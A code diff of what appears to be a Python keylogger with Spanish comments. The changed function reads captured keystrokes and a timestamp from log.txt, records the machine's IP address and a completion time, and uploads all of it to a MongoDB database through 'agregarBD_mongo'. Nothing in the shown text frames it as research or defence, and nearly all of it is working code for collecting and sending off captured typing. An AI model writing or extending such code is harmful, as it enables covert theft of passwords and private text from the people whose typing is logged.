@@ -46,27 +46,27 @@ def convertir(key):
         return str(key)
 
 def extrar_informacion():
-    equipo=""
+    #Guarda la ip del equipo
+    equipo=socket.gethostbyname(socket.gethostname())
     fecha_hora=""
     informacion=""
+    fecha_hora_final = datetime.now().strftime('%Y-%m-%d %H:%M:%S'+"\n")
     contador = 0
     with open("log.txt", "r") as archivo:
         for linea in archivo:
             if contador == 0:
-                equipo = linea
-            elif contador == 1:
                 fecha_hora = linea
             else:
                 informacion = informacion + linea
-            contador = contador + 1
-    agregarBD_mongo(equipo,fecha_hora,informacion)
+            contador = contador+1
 
-def agregarBD_mongo(equipo,fecha_hora,informacion):
+    agregarBD_mongo(equipo,fecha_hora,informacion,fecha_hora_final)
+
+def agregarBD_mongo(equipo,fecha_hora,informacion,fecha_hora_final):
     mongo_conexion = conexion()
-    mongo_conexion.agregar_archivo(equipo,fecha_hora,informacion)
+    mongo_conexion.agregar_archivo(equipo,fecha_hora,informacion,fecha_hora_final)
 
-#IP del equipo
-lista_tecla.append(socket.gethostbyname(socket.gethostname())+"\n")
+
 #Hora de ejecucion del programa
 lista_tecla.append(datetime.now().strftime('%Y-%m-%d %H:%M:%S'+"\n"))
 #Lo que obtenemos al teclear
